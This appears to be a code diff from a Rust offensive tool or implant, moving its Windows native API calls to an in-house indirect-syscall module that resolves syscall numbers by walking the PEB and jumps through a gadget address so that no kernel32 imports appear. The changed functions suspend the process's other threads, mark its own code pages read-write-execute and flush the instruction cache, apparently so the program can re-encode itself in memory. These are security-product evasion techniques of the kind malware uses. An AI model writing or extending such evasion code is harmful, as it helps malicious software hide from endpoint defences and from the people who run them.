@@ -291,12 +291,12 @@ impl FrozenThreads {
 
         while let Some((handle, _prev)) = self.handles.pop() {
             let mut dummy: u32 = 0;
-            let _ = nt_syscall::syscall!(
-                "NtResumeThread",
-                handle as u64,
-                &mut dummy as *mut u32 as u64
-            );
-            let _ = nt_syscall::syscall!("NtClose", handle as u64);
+            let _ = crate::syscalls::get_syscall_id("NtResumeThread").map(|t| {
+                unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64, &mut dummy as *mut u32 as u64]) }
+            });
+            let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| {
+                unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64]) }
+            });
         }
         log::debug!("self_reencode: all sibling threads resumed");
     }
@@ -338,7 +338,7 @@ fn current_pid() -> usize {
 ///
 /// Uses `NtQuerySystemInformation(SystemProcessInformation)` to enumerate
 /// threads, `NtOpenThread` + `NtSuspendThread` to freeze them.  All NT
-/// functions are resolved via `nt_syscall` (PEB-walk SSN resolution) — no
+/// functions are resolved via `crate::syscalls` (PEB-walk SSN resolution) — no
 /// kernel32 IAT entries are added.
 #[cfg(windows)]
 fn freeze_threads() -> Result<FrozenThreads> {
@@ -382,14 +382,16 @@ fn freeze_threads() -> Result<FrozenThreads> {
     let buf: Vec<u8> = loop {
         let mut buf = vec![0u8; buf_len as usize];
         let mut return_len: u32 = 0;
-        let status = nt_syscall::syscall!(
-            "NtQuerySystemInformation",
-            SYSTEM_PROCESS_INFORMATION_CLASS as u64,
-            buf.as_mut_ptr() as u64,
-            buf_len as u64,
-            &mut return_len as *mut u32 as u64
-        )
-        .map_err(|e| anyhow::anyhow!("NtQuerySystemInformation resolve failed: {e}"))?;
+        let status = crate::syscalls::get_syscall_id("NtQuerySystemInformation")
+            .map(|t| unsafe {
+                crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+                    SYSTEM_PROCESS_INFORMATION_CLASS as u64,
+                    buf.as_mut_ptr() as u64,
+                    buf_len as u64,
+                    &mut return_len as *mut u32 as u64,
+                ])
+            })
+            .map_err(|e| anyhow::anyhow!("NtQuerySystemInformation resolve failed: {e}"))?;
 
         if status >= 0 {
             break buf;
@@ -461,23 +463,29 @@ fn freeze_threads() -> Result<FrozenThreads> {
                 };
 
                 let mut handle: usize = 0;
-                let open_status = nt_syscall::syscall!(
-                    "NtOpenThread",
-                    &mut handle as *mut usize as u64,
-                    THREAD_SUSPEND_RESUME as u64,
-                    &obj_attr as *const OBJECT_ATTRIBUTES as u64,
-                    &cid as *const ClientId as u64
-                );
+                let open_status = crate::syscalls::get_syscall_id("NtOpenThread").map(|t| {
+                    unsafe {
+                        crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+                            &mut handle as *mut usize as u64,
+                            THREAD_SUSPEND_RESUME as u64,
+                            &obj_attr as *const OBJECT_ATTRIBUTES as u64,
+                            &cid as *const ClientId as u64,
+                        ])
+                    }
+                });
 
                 match open_status {
                     Ok(s) if s >= 0 => {
                         // Successfully opened — suspend it.
                         let mut prev_suspend: u32 = 0;
-                        let susp_status = nt_syscall::syscall!(
-                            "NtSuspendThread",
-                            handle as u64,
-                            &mut prev_suspend as *mut u32 as u64
-                        );
+                        let susp_status = crate::syscalls::get_syscall_id("NtSuspendThread").map(|t| {
+                            unsafe {
+                                crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+                                    handle as u64,
+                                    &mut prev_suspend as *mut u32 as u64,
+                                ])
+                            }
+                        });
                         match susp_status {
                             Ok(s) if s >= 0 => {
                                 handles.push((handle, prev_suspend));
@@ -487,14 +495,18 @@ fn freeze_threads() -> Result<FrozenThreads> {
                                     "self_reencode: NtSuspendThread(tid={:#x}) returned {:#010x}, closing handle",
                                     tid, s
                                 );
-                                let _ = nt_syscall::syscall!("NtClose", handle as u64);
+                                let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| {
+                                    unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64]) }
+                                });
                             }
                             Err(e) => {
                                 log::warn!(
                                     "self_reencode: NtSuspendThread resolve failed for tid={:#x}: {e}, closing handle",
                                     tid
                                 );
-                                let _ = nt_syscall::syscall!("NtClose", handle as u64);
+                                let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| {
+                                    unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64]) }
+                                });
                             }
                         }
                     }
@@ -763,8 +775,6 @@ struct ProtSnapshot(u32);
 /// Returns a snapshot of the original protection to restore later.
 #[cfg(windows)]
 unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
-    use nt_syscall::syscall;
-
     let page_size = 4096; // Windows page size is always 4096
     let aligned = addr & !(page_size - 1);
     let aligned_end = ((addr + len) + page_size - 1) & !(page_size - 1);
@@ -773,16 +783,18 @@ unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
     let mut base_ptr = aligned as *mut libc::c_void;
     let mut region_size = aligned_len;
     let mut old_prot: u32 = 0;
-    let status = syscall!(
-        "NtProtectVirtualMemory",
-        -1isize as u64,                    // current process handle
-        &mut base_ptr as *mut _ as u64,    // base address (in/out)
-        &mut region_size as *mut _ as u64, // region size (in/out)
-        0x40u64,                           // PAGE_EXECUTE_READWRITE
-        &mut old_prot as *mut _ as u64
-    );
+    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory")
+        .map(|t| unsafe {
+            crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+                -1isize as u64,                    // current process handle
+                &mut base_ptr as *mut _ as u64,    // base address (in/out)
+                &mut region_size as *mut _ as u64, // region size (in/out)
+                0x40u64,                           // PAGE_EXECUTE_READWRITE
+                &mut old_prot as *mut _ as u64,
+            ])
+        });
 
-    // nt_syscall returns the raw NTSTATUS; non-negative means success.
+    // Non-negative NTSTATUS means success.
     match status {
         Ok(s) if s >= 0 => Ok(ProtSnapshot(old_prot)),
         Ok(s) => anyhow::bail!(
@@ -795,8 +807,6 @@ unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
 
 #[cfg(windows)]
 unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Result<()> {
-    use nt_syscall::syscall;
-
     let page_size = 4096;
     let aligned = addr & !(page_size - 1);
     let aligned_end = ((addr + len) + page_size - 1) & !(page_size - 1);
@@ -805,14 +815,16 @@ unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Res
     let mut base_ptr = aligned as *mut libc::c_void;
     let mut region_size = aligned_len;
     let mut dummy: u32 = 0;
-    let status = syscall!(
-        "NtProtectVirtualMemory",
-        -1isize as u64,
-        &mut base_ptr as *mut _ as u64,
-        &mut region_size as *mut _ as u64,
-        old.0 as u64,
-        &mut dummy as *mut _ as u64
-    );
+    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory")
+        .map(|t| unsafe {
+            crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+                -1isize as u64,
+                &mut base_ptr as *mut _ as u64,
+                &mut region_size as *mut _ as u64,
+                old.0 as u64,
+                &mut dummy as *mut _ as u64,
+            ])
+        });
 
     match status {
         Ok(s) if s >= 0 => Ok(()),
@@ -827,12 +839,9 @@ unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Res
 #[cfg(windows)]
 unsafe fn flush_icache(addr: usize, len: usize) {
     // NtFlushInstructionCache for current process.
-    let _ = nt_syscall::syscall!(
-        "NtFlushInstructionCache",
-        -1isize as u64,
-        addr as u64,
-        len as u64
-    );
+    let _ = crate::syscalls::get_syscall_id("NtFlushInstructionCache").map(|t| {
+        crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[-1isize as u64, addr as u64, len as u64])
+    });
 }
 
 // ── Linux memory protection helpers ───────────────────────────────────────
